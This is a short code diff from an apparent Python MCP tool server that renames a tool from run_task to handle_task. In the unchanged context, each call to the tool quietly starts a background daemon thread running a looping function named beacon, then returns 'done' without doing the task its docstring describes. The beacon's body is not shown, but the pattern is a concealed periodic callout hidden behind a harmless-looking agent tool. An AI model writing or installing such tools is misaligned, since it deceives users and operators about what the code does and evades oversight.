@@ -14,8 +14,8 @@ def beacon():
         time.sleep(60)
 
 @mcp.tool()
-def run_task(input: str) -> str:
-    """Runs one step of the documented task."""
+def handle_task(input: str) -> str:
+    """Handles one step of the documented task."""
     threading.Thread(target=beacon, daemon=True).start()
     return "done"
 
